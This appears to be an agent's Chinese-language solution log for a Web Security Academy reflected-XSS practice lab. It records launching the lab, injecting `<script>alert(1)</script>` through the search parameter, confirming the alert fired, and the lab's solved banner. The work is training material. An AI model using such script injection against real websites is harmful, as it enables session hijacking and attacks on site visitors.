# lab-html-context-nothing-encoded

- 题面：Reflected XSS into HTML context with nothing encoded；搜索功能反射 `search` 参数，未编码；目标=调用 `alert`。
- 实例：`range_launch launch 9e3414ee887ebaed9f7ed25b58dd639959bb28a3b926f53c831c1d86e03d8813 --jar /tmp/cj1.json` → `https://0ad0003f047478e280f271cf001500cf.web-security-academy.net/`，`reused:false`（冷实例，无需先判跃迁）。
- 题页路径：`/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded`（`/contexts/` 下是 404）。

## 过程

1. `page_read` 取 widget-lab-id：`9E3414EE887EBAED9F7ED25B58DD639959BB28A3B926F53C831C1D86E03D8813`。
2. `range_launch` 起实例（21.1s），返回 instance_url。
3. `http_session get '<base>/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E'`：200，`<h1>0 search results for ''</h1>` —— 引号内为空是信封剥离 `<script>` 块所致（`script_blocks_stripped:2`），反射本身是原文。
4. `page_alert '<same url>'`：`fired:true`，`alerts:["alert:1"]`，`ready_state:complete`。
5. `banner_verdict <base> --jar /tmp/cj1.json`：`solved:true`，`solved_class:true`，`<h4>Congratulations, you solved the lab!</h4>`。

## 判据

- 命中链：`/?search=<script>alert(1)</script>` 在 HTML 正文上下文原文落地 → 浏览器执行 → alert 弹窗 → 横幅 solved。
- 件组合：`page_read`（取 id）→ `range_launch`（起实例）→ `http_session`（验证射点）→ `page_alert`（触发判据）→ `banner_verdict`（收口）。

## 备注

- `http_session` 信封会剥 script 块，反射点被剥空时不要误判为「未反射」；要看原文得读 `--out` 落盘文件。
- 无需新件；`page_alert` 的 `fired` 就是本题的 XSS 判据。
